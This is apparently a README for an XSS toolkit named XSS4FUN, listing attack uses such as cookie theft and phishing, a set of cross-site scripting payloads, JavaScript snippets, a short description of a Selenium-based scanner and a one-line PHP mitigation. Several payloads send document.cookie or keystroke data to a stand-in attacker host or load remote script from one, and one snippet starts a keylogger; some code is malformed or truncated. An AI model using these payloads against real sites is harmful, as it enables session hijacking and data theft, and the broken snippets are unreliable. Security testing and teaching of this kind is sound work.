# XSS4FUN :cookie:
Cross-Site-Scripting just for fun.

## Cross-Site-Scripting Applications:
  - Steal cookies for session hijacking.
  - Modify Webpage to perform phishing.
  - Inject malicious code.
## Basic payloads:
  - <script>alert(1)</script>

## Useful payloads:
  - **<script src=https://attacker.com/keystroke.js > </script>**
    - To include malicious javascript code in page.
  - **\<img src=anything onerror=alert(1) >**
    - When the **<script>** is being filtered by the Web Application, you can use javascript events.
  - **<script>alert(localStorage.getItem('salary'))</script>**
    - To collect sensitive information stored in Browser Local Storage.
  - **<img src=error onerror=this.src='http://attacker.site/collector.php?data='+document.cookie >**
    - This payload start a loop, so the browser start sending multiple requests to the attacker server with the cookie.

## Javascript useful codes:
  - To perform HTTP GET request
  ```
  var xhttp = new XMLHttpRequest(); //Init xhttp object
  xhttp.open("GET", "https://attacker.site/strokes.php?data=data, true); //GET request
  xhttp.send(); //Send request
  ```
  - Collect pressed key
  ```
  document.addEventListener("keydown",function(e){
  pressed_key = e.key;
  ```
 
## Automated Detection
  ## xss4fun.py
  Using selenium to find input fields and inject payloads, if the injection is sucessful, a printscreen is made.

## Mitigations    
  ## PHP
   Using **htmlspecialchars** to convert special characters to HTML.
  ```
  $word = htmlspecialchars($_GET['word']);
  ```
  So this **<script>alert(1)</script>** becomes this **\&lt;script\&gt;alert(1)\&lt;/script&gt**
